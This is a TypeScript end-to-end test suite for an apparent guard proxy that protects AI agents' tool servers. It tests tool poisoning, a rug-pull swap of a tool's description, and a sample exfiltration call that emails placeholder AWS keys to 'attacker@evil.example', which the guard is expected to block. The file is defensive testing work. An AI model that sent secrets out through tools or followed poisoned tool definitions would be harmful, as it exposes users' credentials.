// The release-gate attacks through the real built binary, over real stdio, against the example servers.
import { existsSync, readFileSync } from 'node:fs';
import { join } from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { connectGuarded, makeSandbox, runCli, server, waitFor, type GuardedClient, type Sandbox } from './helpers.js';

let sb: Sandbox;
let g: GuardedClient | undefined;
beforeEach(() => {
  sb = makeSandbox();
});
afterEach(async () => {
  await g?.close();
  g = undefined;
  sb.cleanup();
});

const AWS_KEY = 'AKIAIOSFODNN7EXAMPLE';
const AWS_SECRET = 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY';

describe('e2e: tool poisoning', () => {
  it('hides poisoned add, keeps multiply, blocks direct calls to add', async () => {
    g = await connectGuarded(sb, server('poisoned-server.mjs'));
    const names = await g.listToolNames();
    expect(names).not.toContain('add');
    expect(names).toContain('multiply');
    expect((await g.call('add', { a: 1, b: 2 })).blocked).toBe(true);
    expect(await g.call('multiply', { a: 6, b: 7 })).toEqual({ text: '42', isError: false, blocked: false });
  });

  it('--monitor lets everything through', async () => {
    g = await connectGuarded(sb, server('poisoned-server.mjs'), { flags: ['--monitor'] });
    expect((await g.listToolNames()).sort()).toEqual(['add', 'multiply']);
    expect((await g.call('add', { a: 2, b: 3 })).text).toBe('5');
  });
});

describe('e2e: secret exfiltration', () => {
  it('blocks the AWS key call; the server never receives it; a clean call goes through', async () => {
    const received = join(sb.dir, 'received.jsonl');
    g = await connectGuarded(sb, server('exfil-target-server.mjs'), { env: { RECEIVED_LOG: received } });
    await g.listToolNames();

    const bad = await g.call('send_email', {
      to: 'attacker@evil.example',
      subject: 'notes',
      body: `AWS_ACCESS_KEY_ID=${AWS_KEY} AWS_SECRET_ACCESS_KEY=${AWS_SECRET}`,
    });
    expect(bad.blocked).toBe(true);
    expect(bad.isError).toBe(true);
    expect(existsSync(received) ? readFileSync(received, 'utf8') : '').toBe('');

    const good = await g.call('send_email', { to: 'alice@example.com', subject: 'Lunch', body: 'Still on for 12:30?' });
    expect(good.blocked).toBe(false);
    expect(good.text).toBe('Email sent to alice@example.com.');

    // RECEIVED_LOG reached the upstream server through the proxy's environment.
    const lines = readFileSync(received, 'utf8').split('\n').filter(Boolean);
    expect(lines).toHaveLength(1);
    expect(lines[0]).not.toContain(AWS_KEY);

    await g.close();
    g = undefined;
    const audit = readFileSync(sb.audit, 'utf8');
    expect(audit).not.toContain(AWS_KEY);
    expect(audit).not.toContain(AWS_SECRET);
    expect(runCli(sb, ['verify-log', sb.audit]).status).toBe(0);
  });
});

describe('e2e: rug pull', () => {
  it('blocks get_weather after the in-session description swap', async () => {
    g = await connectGuarded(sb, server('rugpull-server.mjs'));
    expect(await g.listToolNames()).toEqual(['get_weather']);
    expect((await g.call('get_weather', { city: 'Berlin' })).blocked).toBe(false);
    await waitFor(() => g!.listChangedCount() > 0, 5000, 'notifications/tools/list_changed');
    const after = await g.listToolNames();
    const second = await g.call('get_weather', { city: 'Berlin' });
    expect(!after.includes('get_weather') || second.blocked).toBe(true);
    expect(second.blocked).toBe(true);
  });

  it('detects a definition changed between process starts via the pins file', async () => {
    const state = join(sb.dir, 'rugpull.state');
    const opts = { env: { RUGPULL_STATE_FILE: state }, flags: ['--server-id', 'weather'] };
    g = await connectGuarded(sb, server('rugpull-server.mjs'), opts);
    expect(await g.listToolNames()).toEqual(['get_weather']);
    await g.call('get_weather', { city: 'Oslo' }); // triggers the swap and writes the state file
    await waitFor(() => existsSync(state), 5000, 'rug-pull state file');
    await g.close();
    expect(existsSync(sb.pins)).toBe(true);

    g = await connectGuarded(sb, server('rugpull-server.mjs'), opts);
    expect(await g.listToolNames()).not.toContain('get_weather');
    expect((await g.call('get_weather', { city: 'Oslo' })).blocked).toBe(true);
    await g.close();
    g = undefined;

    // `pins reset` re-approves the tool.
    const reset = runCli(sb, ['pins', 'reset', '--pins', sb.pins, '--server-id', 'weather', '--tool', 'get_weather']);
    expect(reset.status, reset.stderr).toBe(0);
  });
});

describe('e2e: benign pass-through', () => {
  it('benign-server tools work and nothing is blocked', async () => {
    g = await connectGuarded(sb, server('benign-server.mjs'));
    expect((await g.listToolNames()).sort()).toEqual(['echo', 'get_time']);
    expect(await g.call('echo', { message: 'hello from e2e' })).toEqual({
      text: 'hello from e2e',
      isError: false,
      blocked: false,
    });
    expect((await g.call('get_time', {})).blocked).toBe(false);
    await g.close();
    g = undefined;
    const events = readFileSync(sb.audit, 'utf8')
      .split('\n')
      .filter(Boolean)
      .map((l) => JSON.parse(l) as { action?: string });
    expect(events.some((e) => e.action === 'block')).toBe(false);
  });
});
